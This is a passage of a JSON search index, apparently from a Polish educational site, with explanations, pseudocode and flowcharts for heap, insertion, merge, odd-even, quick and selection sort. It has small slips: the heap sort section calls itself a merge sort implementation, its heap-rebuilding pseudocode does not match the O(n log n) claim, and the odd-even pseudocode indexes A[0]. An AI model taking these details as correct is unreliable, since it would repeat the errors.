ka\u017cdego rodzica jest mniejszy lub r\u00f3wny kluczom jego dzieci.</li> <li>Usuwanie element\u00f3w z kopca: nast\u0119pnie usuwamy jeden po drugim elementy z kopca, a po usuni\u0119ciu ka\u017cdego elementu przywracamy w\u0142asno\u015b\u0107 kopca. Proces ten jest powtarzany, a\u017c kopiec b\u0119dzie pusty. Usuni\u0119te elementy tworz\u0105 posortowan\u0105 list\u0119.</li> </ul> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu</p>"},{"location":"algorithms/sorting/heap-sort/#animacja","title":"Animacja","text":""},{"location":"algorithms/sorting/heap-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/heap-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Nasza implementacja algorytmu sortowania przez scalanie sk\u0142ada si\u0119 z dw\u00f3ch cz\u0119\u015bci:</p> <ul> <li>procedura ZbudujKopiec: buduje kopiec binarny bazuj\u0105c na podanej liczbie pocz\u0105tkowych element\u00f3w \\(A\\);</li> <li>procedura SortowaniePrzezKopcowanie: rekurencyjnie wywo\u0142uje budowanie kopca i odk\u0142ada posortowane elementy.</li> </ul>"},{"location":"algorithms/sorting/heap-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura ZbudujKopiec(A, n):\n    1. Od i := 2 do n, wykonuj:\n        2. rodzic := i div 2\n        3. j := i\n\n        4. Dop\u00f3ki j &gt; 0 oraz A[j] &gt; A[rodzic]:\n            5. Zamie\u0144(A[j], A[rodzic])\n            6. j := rodzic\n            7. rodzic := j div 2\n</code></pre> <pre><code>procedura SortowaniePrzezKopcowanie(n, A):\n    1. Dla i := n w d\u00f3\u0142 do 1, wykonuj:\n        2. ZbudujKopiec(A, i)\n        3. Zamie\u0144(A[1], A[i])\n</code></pre>"},{"location":"algorithms/sorting/heap-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"ZbudujKopiec(A, n)\"]) --&gt; K0[i := 2]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2[rodzic := i div 2\n    j := i]\n    K2 --&gt; K4{\"j &gt; 0\n    oraz\n    A[j] &gt; A[rodzic]\"}\n    K4 -- PRAWDA --&gt; K5[\"Zamie\u0144(A[j], A[rodzic])\n    j := rodzic\n    rodzic := j div 2\"]\n    K5 --&gt; K4\n    K4 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowaniePrzezKopcowanie(n, A)\"]) --&gt; K0[i := n]\n    K0 --&gt; K1{i &gt;= 1}\n    K1 -- PRAWDA --&gt; K2[\"ZbudujKopiec(A, i)\n    Zamie\u0144(A[1], A[i])\"]\n    K2 --&gt; K1i[i := i - 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/heap-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Sortowanie przez kopcowanie ma z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n\\log{n})\\) w przypadku najgorszym, \u015brednim i najlepszym, co czyni go bardzo efektywnym algorytmem sortowania, zw\u0142aszcza dla du\u017cych zestaw\u00f3w danych.</p>"},{"location":"algorithms/sorting/heap-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/heap-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/heap-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/heap-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/insertion-sort/","title":"Sortowanie przez wstawianie","text":"<p>Siedzisz przy stole, karty ju\u017c rozdane. Spogl\u0105dasz na karty trzymane w r\u0119ce i stwierdzasz, \u017ce jak ich nie u\u0142o\u017cysz w sensownej kolejno\u015bci to si\u0119 nie po\u0142apiesz. Zaczynasz wi\u0119c od drugiej karty i przesuwasz j\u0105 w lewo, by trafi\u0142a na swoje miejsce. Teraz bierzesz trzeci\u0105 i ponownie przesuwasz j\u0105 w lewo, a\u017c b\u0119dzie poprawnie u\u0142o\u017cona. Podobnie post\u0119pujesz z czwart\u0105 i kolejnymi kartami: ka\u017cd\u0105 kolejn\u0105 bierzesz do r\u0119ki i przesuwasz w lewo, a\u017c wstawisz j\u0105 na w\u0142a\u015bciwe miejsce na r\u0119ce. Tym o to sposobem zrealizowa\u0142e\u015b algorytm sortowania przez wstawianie.</p> <p>Poni\u017cej znajdziesz animacje przedstawiaj\u0105ce ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/insertion-sort/#animacja-1","title":"Animacja 1","text":""},{"location":"algorithms/sorting/insertion-sort/#animacja-2","title":"Animacja 2","text":"<p>Sortowanie przez wstawianie</p>"},{"location":"algorithms/sorting/insertion-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/insertion-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Zaczynamy od drugiego elementu tablicy. B\u0119dziemy go przesuwa\u0107 w lewo tak d\u0142ugo, a\u017c nie trafi na swoje miejsce. Innymi s\u0142owy b\u0119dziemy przesuwa\u0107 go w lewo, dop\u00f3ki nie trafi na pocz\u0105tek tablicy i dop\u00f3ki element po jego lewej stronie b\u0119dzie wi\u0119kszy. I tak post\u0119pujemy z ka\u017cdym kolejnym elementem tablicy.</p>"},{"location":"algorithms/sorting/insertion-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowaniePrzezWstawianie(n, A):\n    1. Od i := 2 do n, wykonuj:\n        2. j := i\n        3. Dop\u00f3ki j &gt; 1 oraz A[j] &lt; A[j - 1], to:\n            4. Zamie\u0144(A[j], A[j - 1])\n            5. j := j - 1\n</code></pre>"},{"location":"algorithms/sorting/insertion-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowaniePrzezWstawianie(n, A)\"]) --&gt; K0[i := 2]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2[j := i]\n    K2 --&gt; K3{\"j &gt; 1\n    oraz\n    A[j] &lt; A[j - 1]\"}\n    K3 -- PRAWDA --&gt; K4[\"Zamie\u0144(A[j], A[j - 1])\n    j := j - 1\"]\n    K4 --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/insertion-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n^2)\\) \u2014 kwadratowa</p> <p>Dwie zagnie\u017cd\u017cone p\u0119tle. Chocia\u017c warunkowa p\u0119tla wewn\u0119trzna wykonuje zawsze co najwy\u017cej tyle obrot\u00f3w, ile wynosi indeks obecnie przesuwanego elementu, to i tak otrzymujemy z\u0142o\u017cono\u015b\u0107 kwadratow\u0105, co mo\u017cna do\u015b\u0107 \u0142atwo samodzielnie policzy\u0107.</p>"},{"location":"algorithms/sorting/insertion-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/insertion-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/insertion-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/insertion-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/merge-sort/","title":"Sortowanie przez scalanie","text":"<p>Sortowanie przez scalanie (ang. Merge Sort) jest jednym z klasycznych, ale wydajnych algorytm\u00f3w sortowania danych. Jest oparty na metodzie dziel i zwyci\u0119\u017caj, co oznacza, \u017ce problem jest dzielony na mniejsze podproblemy, kt\u00f3re s\u0105 \u0142atwiejsze do rozwi\u0105zania, a nast\u0119pnie te rozwi\u0105zania mniejszych problem\u00f3w s\u0105 \u0142\u0105czone, aby uzyska\u0107 ostateczne rozwi\u0105zanie pe\u0142nego problemu.</p> <p>Algorytm sortowania przez scalanie dzia\u0142a poprzez podzia\u0142 nieposortowanego zestawu danych na \\(n\\) mniejszych podzbior\u00f3w, a\u017c do momentu, kiedy ka\u017cdy podzbi\u00f3r b\u0119dzie zawiera\u0142 tylko jeden element (jeden element jest z definicji posortowany). Nast\u0119pnie, te pojedyncze elementy s\u0105 \u0142\u0105czone ze sob\u0105 (scalane) w spos\u00f3b, kt\u00f3ry zapewnia, \u017ce s\u0105 one u\u0142o\u017cone w odpowiedniej kolejno\u015bci (posortowane).</p> <p>G\u0142\u00f3wne etapy tego algorytmu to:</p> <ul> <li>Podzia\u0142: lista do posortowania jest dzielona na p\u00f3\u0142, tworz\u0105c dwa mniejsze podzbiory. Proces ten jest powtarzany rekurencyjnie, a\u017c do momentu, kiedy ka\u017cdy podzbi\u00f3r b\u0119dzie zawiera\u0142 tylko jeden element.</li> <li>Scalanie: pojedyncze podzbiory s\u0105 \u0142\u0105czone ze sob\u0105 w pary w taki spos\u00f3b, aby by\u0142y posortowane. Nast\u0119pnie pary s\u0105 \u0142\u0105czone w grupy po cztery, nast\u0119pnie grupy po cztery s\u0105 \u0142\u0105czone w grupy po osiem, itd., a\u017c do momentu, kiedy wszystkie elementy zostan\u0105 po\u0142\u0105czone w jedn\u0105 posortowan\u0105 list\u0119.</li> </ul> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu, a tak\u017ce prezentacj\u0119, na kt\u00f3rej poszczeg\u00f3lne kroki algorytmu s\u0105 wyja\u015bnione w jak najprostszy spos\u00f3b.</p>"},{"location":"algorithms/sorting/merge-sort/#animacja-1","title":"Animacja 1","text":""},{"location":"algorithms/sorting/merge-sort/#animacja-2","title":"Animacja 2","text":"<p>Animacja sortowania przez scalanie</p>"},{"location":"algorithms/sorting/merge-sort/#prezentacja","title":"Prezentacja","text":"<p> Sortowanie przez scalanie - prezentacja</p>"},{"location":"algorithms/sorting/merge-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/merge-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Nasza implementacja algorytmu sortowania przez scalanie sk\u0142ada si\u0119 z dw\u00f3ch cz\u0119\u015bci:</p> <ul> <li>procedura Scal: scala ze sob\u0105 dwie podtablice zdefiniowane poprzez zakres element\u00f3w z tablicy \\(A\\);</li> <li>procedura SortowaniePrzezScalanie: rekurencyjnie dzieli tablic\u0119 na dwie mniejsze podtablice, kt\u00f3re s\u0105 na ko\u0144cu scalane.</li> </ul> <p>Idea dzia\u0142ania procedury Scal jest prosta. Tworzymy pomocnicz\u0105 tablic\u0119, do kt\u00f3rej b\u0119dziemy wrzuca\u0107 posortowane warto\u015bci. Nast\u0119pnie przechodzimy przez kolejne elementy zdefiniowanych podtablic, por\u00f3wnujemy je ze sob\u0105 i mniejszy element umieszczamy na kolejnym miejscu w pomocniczej tablicy. Podczas tej operacji trzeba uwa\u017ca\u0107, \u017ceby nie wyj\u015b\u0107 poza zakres podtablic. Je\u017celi elementy jednej z podtablic nam si\u0119 \"sko\u0144cz\u0105\" (a tak zawsze nast\u0105pi), to bierzemy ju\u017c elementy tylko z drugiej podtablicy.</p> <p>Po wype\u0142nieniu tablicy pomocniczej posortowanymi warto\u015bciami, przepisujemy j\u0105 do naszej g\u0142\u00f3wnej, sortowanej tablicy \\(A\\).</p> <p>Procedura SortowaniePrzezScalanie jest procedur\u0105 rekurencyjn\u0105, kt\u00f3ra poza tablic\u0105 do posortowania przyjmuje tak\u017ce pocz\u0105tek i koniec sortowanego zakresu (w formie indeks\u00f3w tablicy). Na pocz\u0105tku zaczynamy od warunku stopu, tzn. sprawdzamy, czy podany przedzia\u0142 zawiera co najmniej jeden element. Je\u017celi tak nie jest, to ko\u0144czymy obecne wywo\u0142anie. Gdy w przedziale mamy co sortowa\u0107, to wyznaczamy \u015brodek przedzia\u0142u, kt\u00f3ry pos\u0142u\u017cy nam do podzia\u0142u tablicy na dwie podtablice. Nast\u0119pnie wywo\u0142ujemy rekurencyjnie nasz\u0105 sortuj\u0105c\u0105 procedur\u0119, odpowiednio zmieniaj\u0105c sortowane zakresy (od pocz\u0105tku do \u015brodka, od \u015brodka do ko\u0144ca). Na koniec, gdy nasze dwie podtablice s\u0105 ju\u017c posortowane (co wynika m.in. z rekurencyjnej struktury funkcji), scalamy je ze sob\u0105 za pomoc\u0105 procedury Scal.</p>"},{"location":"algorithms/sorting/merge-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura Scal(A, pocz, kon, sr):\n    1. dl := kon - pocz\n    2. scalona := [1..dl]\n    3. i1 := pocz\n    4. i2 := sr\n\n    5. Dla i := 1 do dl, wykonuj:\n        6. Je\u017celi i1 &gt;= sr lub (i2 &lt; kon oraz A[i1] &gt; A[i2]), to:\n            7. scalona[i] := A[i2]\n            8. i2 := i2 + 1\n        10. w przeciwnym przypadku, je\u017celi i2 &gt;= kon lub A[i1] &lt;= A[i2], to:\n            11. scalona[i] := A[i1]\n            12. i1 := i1 + 1\n\n    13. Dla i := 1 do dl, wykonuj:\n        14. A[pocz + i] := scalona[i]\n</code></pre> <pre><code>procedura SortowaniePrzezScalanie(A, pocz, kon):\n    1. Je\u017celi kon - pocz &lt;= 1, to:\n        2. Zako\u0144cz\n\n    3. sr := (pocz + kon) div 2\n\n    4. SortowaniePrezScalanie(A, pocz, sr)\n    5. SortowaniePrezScalanie(A, sr, kon)\n\n    6. Scal(A, pocz, kon, sr)\n</code></pre>"},{"location":"algorithms/sorting/merge-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Scal(A, pocz, kon, sr)\"]) --&gt; K1[\"dl := kon - pocz\n    scalona := [1..dl]\n    i1 := pocz\n    i2 := sr\n    i := 1\"]\n    K1 --&gt; K5{i &lt;= dl}\n    K5 -- PRAWDA --&gt; K6{\"i1 &gt;= sr\n    lub\n    (i2 &lt; kon\n    oraz\n    A[i1] &gt; A[i2])\"}\n    K6 -- PRAWDA --&gt; K7[\"scalona[i] := A[i2]\n    i2 := i2 + 1\"]\n    K6 -- FA\u0141SZ --&gt; K10{\"i2 &gt;= kon\n    lub\n    A[i1] &lt;= A[i2]\"}\n    K10 -- PRAWDA --&gt; K11[\"scalona[i] := A[i1]\n    i1 := i1 + 1\"]\n    K10 -- FA\u0141SZ --&gt; K5i[i := i + 1]\n    K7 --&gt; K5i\n    K11 --&gt; K5i\n    K5i --&gt; K5\n    K5 -- FA\u0141SZ --&gt; K13p[i := 1]\n    K13p --&gt; K13{i &lt;= dl}\n    K13 -- PRAWDA --&gt; K14[\"A[pocz + i] := scalona[i]\"]\n    K14 --&gt; K13i[i := i + 1]\n    K13i --&gt; K13\n    K13 -- FA\u0141SZ ---&gt; STOP([STOP])</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowaniePrzezScalanie(A, pocz, kon)\"]) --&gt; K1{kon - pocz &lt;= 1}\n    K1 -- PRAWDA --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3[\"sr := (pocz + kon) / 2\n    SortowaniePrzezScalanie(A, pocz, sr)\n    SortowaniePrzezScalanie(A, sr, kon)\n    Scal(A, pocz, kon, sr)\"]\n    K3 --&gt; STOP</code></pre>"},{"location":"algorithms/sorting/merge-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Sortowanie przez scalanie ma z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n\\log{n})\\) zar\u00f3wno w przypadku najgorszym, jak i \u015brednim, co czyni go efektywnym algorytmem sortowania dla du\u017cych zestaw\u00f3w danych.</p>"},{"location":"algorithms/sorting/merge-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/merge-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/merge-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/merge-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/merge-sort/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/sorting/merge-sort/#julia","title":"Julia","text":""},{"location":"algorithms/sorting/odd-even-sort/","title":"Sortowanie odd-even","text":"<p>Sortowanie nieparzysto-parzyste (ang. Odd-even), znane r\u00f3wnie\u017c jako sortowanie b\u0105belkowe dwufazowe lub sortowanie Brick Sort, to algorytm sortuj\u0105cy, kt\u00f3ry dzia\u0142a na zasadzie por\u00f3wnywania wszystkich par element\u00f3w nieparzysto-parzystych (indeksy s\u0105 parzyste lub nieparzyste) listy, kt\u00f3re nast\u0119pnie, je\u015bli s\u0105 w z\u0142ej kolejno\u015bci, s\u0105 zamieniane miejscami. Ta operacja jest powtarzana, a\u017c lista zostanie posortowana.</p> <p>Algorytm sortowania nieparzysto-parzystego sk\u0142ada si\u0119 z nast\u0119puj\u0105cych krok\u00f3w:</p> <ul> <li> <p>Faza nieparzysta: przegl\u0105daj ca\u0142\u0105 list\u0119 i dla ka\u017cdej pary element\u00f3w na nieparzystych pozycjach \\(i\\), je\u017celi element na pozycji \\(i\\) jest wi\u0119kszy od elementu na pozycji \\(i+1\\), zamie\u0144 je miejscami.</p> </li> <li> <p>Faza parzysta: przegl\u0105daj ca\u0142\u0105 list\u0119 i dla ka\u017cdej pary element\u00f3w na parzystych pozycjach \\(i\\), je\u017celi element na pozycji \\(i\\) jest wi\u0119kszy od elementu na pozycji \\(i+1\\), zamie\u0144 je miejscami.</p> </li> <li> <p>Powtarzaj fazy: powtarzaj powy\u017csze fazy, a\u017c lista zostanie ca\u0142kowicie posortowana.</p> </li> </ul> <p>Algorytm ten kontynuuje te dwie fazy, dop\u00f3ki nie posortuje ca\u0142ej listy. G\u0142\u00f3wnym za\u0142o\u017ceniem jest to, \u017ce po ka\u017cdej iteracji najmniejszy element porusza si\u0119 co najmniej o jedn\u0105 pozycj\u0119 do przodu.</p> <p>Poni\u017cej znajdziesz animacj\u0119 przedstawiaj\u0105c\u0105 ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/odd-even-sort/#animacja","title":"Animacja","text":"<p>Sortowanie odd-even</p>"},{"location":"algorithms/sorting/odd-even-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/sorting/odd-even-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura OddEvenSort(n, A):\n    1. Od i := 1 do n, wykonuj:\n        2. Je\u017celi i mod 2 = 1, to:\n            3. Dla j := 2 do n, z krokiem 2, wykonuj:\n                4. Je\u017celi A[j] &lt; A[j - 1]:\n                    5. Zamie\u0144(A[j], A[j - 1])\n        6. w przeciwnym przypadku:\n            7. Dla j := 1 do n, z krokiem 2, wykonuj:\n                8. Je\u017celi A[j] &lt; A[j - 1]:\n                    9. Zamie\u0144(A[j], A[j - 1])\n</code></pre>"},{"location":"algorithms/sorting/odd-even-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"OddEvenSort(n, A)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2{i mod 2 = 1}\n    K2 -- PRAWDA --&gt; K3p[j := 2]\n    K3p --&gt; K3{j &lt;= n}\n    K3 -- PRAWDA --&gt; K4{\"A[j] &lt; A[j - 1]\"}\n    K4 -- PRAWDA --&gt; K5[\"Zamie\u0144(A[j], A[j - 1])\"]\n    K5 --&gt; K3i[j := j + 2]\n    K4 -- FA\u0141SZ --&gt; K3i\n    K3i --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K2 -- FA\u0141SZ --&gt; K7p[j := 1]\n    K7p --&gt; K7{j &lt;= n}\n    K7 -- PRAWDA --&gt; K8{\"A[j] &lt; A[j - 1]\"}\n    K8 -- PRAWDA --&gt; K9[\"Zamie\u0144(A[j], A[j - 1])\"]\n    K9 --&gt; K7i[j := j + 2]\n    K8 -- FA\u0141SZ --&gt; K7i\n    K7i --&gt; K7\n    K7 -- FA\u0141SZ --&gt; K1i\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ -------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/odd-even-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Algorytm sortowania nieparzysto-parzystego ma z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n^2)\\), zar\u00f3wno w przypadku \u015brednim, jak i najgorszym. Jest to wi\u0119c algorytm nieefektywny dla du\u017cych zestaw\u00f3w danych.</p>"},{"location":"algorithms/sorting/odd-even-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/odd-even-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/odd-even-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/odd-even-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/quick-sort/","title":"Sortowanie szybkie","text":"<p>Sortowanie szybkie (ang. Quicksort) to jeden z najwa\u017cniejszych algorytm\u00f3w sortuj\u0105cych w informatyce, dzi\u0119ki swojej wydajno\u015bci i prostocie implementacji. Algorytm ten opiera si\u0119 na strategii dziel i zwyci\u0119\u017caj, gdzie problem dzielony jest na mniejsze podproblemy, kt\u00f3re s\u0105 rozwi\u0105zywane niezale\u017cnie, a potem ich wyniki s\u0105 \u0142\u0105czone w celu uzyskania rozwi\u0105zania problemu pierwotnego.</p> <p>Quicksort opiera si\u0119 na nast\u0119puj\u0105cych krokach:</p> <ul> <li>Wyb\u00f3r elementu dziel\u0105cego (pivot): wybieramy jeden z element\u00f3w listy, kt\u00f3ry b\u0119dzie s\u0142u\u017cy\u0142 jako \"pivot\". Wyb\u00f3r odpowiedniego pivotu mo\u017ce znacznie wp\u0142ywa\u0107 na wydajno\u015b\u0107 algorytmu, ale w praktyce cz\u0119sto wybiera si\u0119 pierwszy, ostatni lub \u015brodkowy element listy.</li> <li>Podzia\u0142 listy: nast\u0119pnie lista dzielona jest na dwa podzbiory: jeden zawieraj\u0105cy elementy mniejsze od pivotu, a drugi zawieraj\u0105cy elementy wi\u0119ksze lub r\u00f3wne pivotowi.</li> <li>Rekurencja: powy\u017csze kroki s\u0105 powtarzane rekurencyjnie na obu podzbiorach, a\u017c do momentu, gdy podzbi\u00f3r b\u0119dzie zawiera\u0142 tylko jeden element (jest ju\u017c posortowany).</li> </ul> <p>Poni\u017cej znajdziesz prezentacj\u0119, na kt\u00f3rej poszczeg\u00f3lne kroki algorytmu s\u0105 wyja\u015bnione w jak najprostszy spos\u00f3b.</p>"},{"location":"algorithms/sorting/quick-sort/#prezentacja","title":"Prezentacja","text":"<p> Sortowanie szybkie - prezentacja</p>"},{"location":"algorithms/sorting/quick-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/quick-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":""},{"location":"algorithms/sorting/quick-sort/#pseudokod","title":"Pseudokod","text":"<pre><code>procedura SortowanieSzybkie(A, pocz, kon):\n    1. Je\u017celi kon &lt;= pocz, to:\n        2. Zako\u0144cz\n\n    3. pivot := A[(pocz + kon) div 2]\n    4. lewy := pocz\n    5. prawy := kon\n\n    6. Dop\u00f3ki lewy &lt;= prawy, wykonuj:\n        7. Dop\u00f3ki A[lewy] &lt; pivot, wykonuj:\n            8. lewy := lewy + 1\n\n        9. Dop\u00f3ki A[prawy] &gt; pivot, wykonuj:\n            10. prawy := prawy - 1\n\n        11. Je\u017celi lewy &gt; prawy, to:\n            12. Przerwij p\u0119tl\u0119\n\n        13. Zamie\u0144(A[lewy], A[prawy])\n\n        14. lewy := lewy + 1\n        15. prawy := prawy - 1\n\n    16. SortowanieSzybkie(A, pocz, prawy)\n    17. SortowanieSzybkie(A, lewy, kon)\n</code></pre>"},{"location":"algorithms/sorting/quick-sort/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SortowanieSzybkie(A, pocz, kon)\"]) --&gt; K1{kon &lt;= pocz}\n    K1 -- PRAWDA --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3[\"pivot := A[(pocz + kon) div 2]\n    lewy := pocz\n    prawy := kon\"]\n    K3 --&gt; K6{lewy &lt;= prawy}\n    K6 -- PRAWDA --&gt; K7{\"A[lewy] &lt; pivot\"}\n    K7 -- PRAWDA --&gt; K8[lewy := lewy + 1]\n    K8 --&gt; K7\n    K7 -- FA\u0141SZ --&gt; K9{\"A[prawy] &gt; pivot\"}\n    K9 -- PRAWDA --&gt; K10[prawy := prawy - 1]\n    K10 --&gt; K9\n    K9 -- FA\u0141SZ --&gt; K11{lewy &gt; prawy}\n    K11 -- PRAWDA --&gt; K16[\"SortowanieSzybkie(A, pocz, prawy)\n    SortowanieSzybkie(A, lewy, kon)\"]\n    K11 -- FA\u0141SZ --&gt; K13[\"Zamie\u0144(A[lewy], A[prawy])\n    lewy := lewy + 1\n    prawy := prawy - 1\"]\n    K13 --&gt; K6\n    K6 -- FA\u0141SZ --&gt; K16\n    K16 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/sorting/quick-sort/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>Algorytm Quicksort ma z\u0142o\u017cono\u015b\u0107 obliczeniow\u0105 \\(O(n\\log{n})\\) w przypadku \u015brednim, co czyni go jednym z najbardziej efektywnych algorytm\u00f3w sortuj\u0105cych. Jednak\u017ce, w najgorszym przypadku, gdy podzia\u0142 listy jest zawsze najbardziej nier\u00f3wnomierny (na przyk\u0142ad, gdy lista jest ju\u017c posortowana), z\u0142o\u017cono\u015b\u0107 obliczeniowa mo\u017ce wzrosn\u0105\u0107 do \\(O(n^2)\\).</p>"},{"location":"algorithms/sorting/quick-sort/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/sorting/quick-sort/#c","title":"C++","text":""},{"location":"algorithms/sorting/quick-sort/#python","title":"Python","text":""},{"location":"algorithms/sorting/quick-sort/#kotlin","title":"Kotlin","text":""},{"location":"algorithms/sorting/quick-sort/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/sorting/quick-sort/#julia","title":"Julia","text":""},{"location":"algorithms/sorting/selection-sort/","title":"Sortowanie przez wybieranie","text":"<p>Wyobra\u017a sobie, \u017ce przed tob\u0105 le\u017c\u0105 ksi\u0105\u017cki, u\u0142o\u017cone tak, \u017ce widzisz tytu\u0142 i autora ka\u017cdej z nich. Twoje zadanie polega na uporz\u0105dkowaniu tych ksi\u0105\u017cek na p\u00f3\u0142ce w kolejno\u015bci alfabetycznej po nazwiskach autor\u00f3w. Najpierw przegl\u0105dasz dost\u0119pne ksi\u0105\u017cki szukaj\u0105c autora z nazwiskiem pierwszym w kolejno\u015bci alfabetycznej. Znajdujesz, bierzesz ksi\u0105\u017ck\u0119 do r\u0119ki i umieszczasz na p\u00f3\u0142ce. Teraz patrzysz na pozosta\u0142e ksi\u0105\u017cki i ponownie szukasz pierwszego (w kolejno\u015bci alfabetycznej) nazwiska z tych, kt\u00f3re pozosta\u0142y. Znajdujesz i odk\u0142adasz na p\u00f3\u0142k\u0119, jako drug\u0105 ksi\u0105\u017ck\u0119. Post\u0119pujesz podobnie, powtarzaj\u0105c te czynno\u015bci tak d\u0142ugo, a\u017c u\u0142o\u017cysz wszystkie ksi\u0105\u017cki na p\u00f3\u0142ce, posortowane po nazwiskach autor\u00f3w. Brawo, w\u0142a\u015bnie zastosowa\u0142e\u015b algorytm sortowania przez wybieranie!</p> <p>Poni\u017cej znajdziesz animacje przedstawiaj\u0105ce ide\u0119 omawianego algorytmu.</p>"},{"location":"algorithms/sorting/selection-sort/#animacja-1","title":"Animacja 1","text":""},{"location":"algorithms/sorting/selection-sort/#animacja-2","title":"Animacja 2","text":"<p>Sortowanie przez wybieranie</p>"},{"location":"algorithms/sorting/selection-sort/#taneczne-sortowanie","title":"Taneczne sortowanie","text":"<p> Taneczne sortowanie</p>"},{"location":"algorithms/sorting/selection-sort/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Sortowanie przez wybieranie sk\u0142ada si\u0119 tak w\u0142a\u015bciwie z dw\u00f3ch cz\u0119\u015bci: znajdowania minimum i samego sortowania. Opis algorytmu znajdowania minimum mo\u017cna znale\u017a\u0107 tutaj: Wyszukiwanie minimum i maksimum.</p> <p>Sam algorytm wyszukiwania minimum musimy zmodyfikowa\u0107 tak, by dzia\u0142a\u0142 na okre\u015blonym przedziale w tablicy, tzn. chcemy wyszuka\u0107 minimum nie w ca\u0142ej tablicy, a w jej konkretnym przedziale \\([p..k]\\). Co wi\u0119cej, potrzebujemy nie tyle zna\u0107 warto\u015b\u0107 minimaln\u0105, co jej pozycj\u0119 w tablicy. Gdy to ju\u017c mamy, samo sortowanie jest bardzo proste. Przechodzimy przez kolejne 